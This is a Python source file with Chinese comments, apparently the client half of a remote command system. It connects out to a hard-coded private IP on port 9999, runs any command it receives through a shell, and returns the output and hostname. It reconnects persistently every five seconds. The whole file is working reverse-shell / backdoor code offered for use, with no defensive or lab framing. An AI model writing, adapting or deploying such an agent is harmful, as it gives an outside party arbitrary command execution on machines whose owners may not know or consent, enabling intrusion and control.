import socket
import subprocess
import json
import time
import threading
from datetime import datetime

class CommandClient:
    def __init__(self, server_host='10.110.237.100', server_port=9999):
        self.server_host = server_host
        self.server_port = server_port
        self.client_socket = None
        self.running = False
        self.reconnect_delay = 5  # 重连延迟（秒）
        
    def connect(self):
        """连接到服务器"""
        while self.running:
            try:
                self.client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.client_socket.connect((self.server_host, self.server_port))
                print(f"[*] 已连接到服务器 {self.server_host}:{self.server_port}")
                return True
            except Exception as e:
                print(f"[-] 连接失败: {e}")
                print(f"[*] {self.reconnect_delay}秒后重试...")
                time.sleep(self.reconnect_delay)
        return False
    
    def execute_command(self, command):
        """执行命令并返回结果"""
        try:
            # 使用subprocess执行命令
            process = subprocess.Popen(
                command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                encoding='gbk'  # Windows系统使用gbk编码
            )
            
            stdout, stderr = process.communicate(timeout=30)
            
            output = stdout
            if stderr:
                output += "\n[错误输出]\n" + stderr
            
            if not output.strip():
                output = "[命令执行完成，无输出]"
                
            return output
            
        except subprocess.TimeoutExpired:
            process.kill()
            return "[错误] 命令执行超时"
        except Exception as e:
            return f"[错误] 命令执行失败: {str(e)}"
    
    def start(self):
        """启动客户端"""
        self.running = True
        print(f"[*] 客户端启动，目标服务器: {self.server_host}:{self.server_port}")
        
        while self.running:
            if self.connect():
                try:
                    # 接收命令
                    while self.running:
                        data = self.client_socket.recv(4096)
                        if not data:
                            print("[-] 与服务器断开连接")
                            break
                        
                        try:
                            message = json.loads(data.decode('utf-8'))
                            command = message.get('command', '')
                            
                            if command:
                                print(f"[*] 收到命令: {command}")
                                
                                # 执行命令
                                output = self.execute_command(command)
                                
                                # 构造返回结果
                                result = {
                                    'command': command,
                                    'output': output,
                                    'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                                    'hostname': socket.gethostname()
                                }
                                
                                # 发送结果
                                response = json.dumps(result, ensure_ascii=False).encode('utf-8')
                                self.client_socket.send(response)
                                print(f"[*] 命令执行完成，结果已返回")
                            else:
                                print("[-] 收到空命令")
                                
                        except json.JSONDecodeError as e:
                            print(f"[-] 解析命令失败: {e}")
                        except Exception as e:
                            print(f"[-] 处理命令时出错: {e}")
                            break
                            
                except Exception as e:
                    print(f"[-] 接收命令时出错: {e}")
                finally:
                    if self.client_socket:
                        self.client_socket.close()
                    
                print(f"[*] {self.reconnect_delay}秒后尝试重连...")
                time.sleep(self.reconnect_delay)
            else:
                break
    
    def stop(self):
        """停止客户端"""
        print("[*] 正在关闭客户端...")
        self.running = False
        if self.client_socket:
            try:
                self.client_socket.close()
            except:
                pass
        print("[*] 客户端已关闭")

if __name__ == "__main__":
    # 修改为你的服务器IP地址
    SERVER_HOST = '10.110.237.100'  # 请修改为实际服务器IP
    SERVER_PORT = 9999
    
    client = CommandClient(server_host=SERVER_HOST, server_port=SERVER_PORT)
    
    try:
        client.start()
    except KeyboardInterrupt:
        print("\n[*] 收到退出信号")
        client.stop()